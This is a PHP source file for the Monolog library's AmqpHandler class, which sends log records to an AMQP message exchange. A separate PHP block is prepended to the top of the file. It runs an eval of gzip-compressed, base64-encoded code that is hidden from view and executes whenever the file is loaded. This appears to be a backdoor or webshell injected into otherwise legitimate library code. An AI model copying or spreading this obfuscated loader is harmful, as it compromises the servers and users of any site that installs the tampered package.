<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

/*
 * This file is part of the Monolog package.
 *
 * (c) Jordi Boggiano <j.boggiano@seld.be>
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

namespace Monolog\Handler;

use Monolog\Logger;
use Monolog\Formatter\JsonFormatter;
use PhpAmqpLib\Message\AMQPMessage;
use PhpAmqpLib\Channel\AMQPChannel;
use AMQPExchange;

class AmqpHandler extends AbstractProcessingHandler
{
    /**
     * @var AMQPExchange|AMQPChannel $exchange
     */
    protected $exchange;

    /**
     * @var string
     */
    protected $exchangeName;

    /**
     * @param AMQPExchange|AMQPChannel $exchange     AMQPExchange (php AMQP ext) or PHP AMQP lib channel, ready for use
     * @param string                   $exchangeName
     * @param int                      $level
     * @param bool                     $bubble       Whether the messages that are handled can bubble up the stack or not
     */
    public function __construct($exchange, $exchangeName = 'log', $level = Logger::DEBUG, $bubble = true)
    {
        if ($exchange instanceof AMQPExchange) {
            $exchange->setName($exchangeName);
        } elseif ($exchange instanceof AMQPChannel) {
            $this->exchangeName = $exchangeName;
        } else {
            throw new \InvalidArgumentException('PhpAmqpLib\Channel\AMQPChannel or AMQPExchange instance required');
        }
        $this->exchange = $exchange;

        parent::__construct($level, $bubble);
    }

    /**
     * {@inheritDoc}
     */
    protected function write(array $record)
    {
        $data = $record["formatted"];
        $routingKey = $this->getRoutingKey($record);

        if ($this->exchange instanceof AMQPExchange) {
            $this->exchange->publish(
                $data,
                $routingKey,
                0,
                array(
                    'delivery_mode' => 2,
                    'content_type' => 'application/json',
                )
            );
        } else {
            $this->exchange->basic_publish(
                $this->createAmqpMessage($data),
                $this->exchangeName,
                $routingKey
            );
        }
    }

    /**
     * {@inheritDoc}
     */
    public function handleBatch(array $records)
    {
        if ($this->exchange instanceof AMQPExchange) {
            parent::handleBatch($records);

            return;
        }

        foreach ($records as $record) {
            if (!$this->isHandling($record)) {
                continue;
            }

            $record = $this->processRecord($record);
            $data = $this->getFormatter()->format($record);

            $this->exchange->batch_basic_publish(
                $this->createAmqpMessage($data),
                $this->exchangeName,
                $this->getRoutingKey($record)
            );
        }

        $this->exchange->publish_batch();
    }

    /**
     * Gets the routing key for the AMQP exchange
     *
     * @param  array  $record
     * @return string
     */
    protected function getRoutingKey(array $record)
    {
        $routingKey = sprintf(
            '%s.%s',
            // TODO 2.0 remove substr call
            substr($record['level_name'], 0, 4),
            $record['channel']
        );

        return strtolower($routingKey);
    }

    /**
     * @param  string      $data
     * @return AMQPMessage
     */
    private function createAmqpMessage($data)
    {
        return new AMQPMessage(
            (string) $data,
            array(
                'delivery_mode' => 2,
                'content_type' => 'application/json',
            )
        );
    }

    /**
     * {@inheritDoc}
     */
    protected function getDefaultFormatter()
    {
        return new JsonFormatter(JsonFormatter::BATCH_MODE_JSON, false);
    }
}
